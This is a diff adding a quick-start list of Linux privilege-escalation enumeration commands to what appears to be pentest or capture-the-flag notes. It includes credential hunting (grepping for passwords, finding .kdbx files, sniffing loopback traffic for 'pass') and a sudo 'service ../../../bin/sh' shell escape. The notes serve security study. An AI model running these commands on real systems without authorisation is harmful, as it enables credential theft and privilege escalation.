@@ -1,7 +1,40 @@
 ~~~Automated Enumeration~~~
 ./unix-privesc-check standard
 
-~~~Manual Enumeration~~~
+~~~Manual Enumeration Quick Start~~~
+
+sudo -l
+su root
+id
+env
+cat /etc/passwd
+uname -a
+ps aux
+watch -n 1 "ps -aux | grep pass"
+ss -anp
+netstat -anp
+grep -nRw '8080\|8081' /etc/* 2>/dev/null
+ls -lah /etc/cron*
+cat /etc/crontab
+crontab -l
+sudo crontab -l
+grep "CRON" /var/log/syslog
+cat /etc/cron*
+cat /etc/crontab
+cat /etc/anacrontab
+find / -writable -type d 2>/dev/null       
+find / -name flag.txt    #Search for file by filename
+find / -iname flag.txt    #Search for file by filename case insenstive
+find /path/to/search -ctime -1    #Find things changed in the last 24 hours
+find /path/to/search -user owner
+find / -name *.kdbx 2>/dev/null
+grep -R -i "password" /var/www -s -n
+find / -perm -u=s -type f 2>/dev/null      #search for SUID-marked binaries
+find / -perm -1000 -type d 2>/dev/null    
+find / -perm -g=s -type f 2>/dev/null    
+sudo -i
+sudo tcpdump -i lo -A | grep "pass"
+sudo -u steven /usr/sbin/service ../../../bin/sh
 
 #General Enumeration
 id      #View current User info
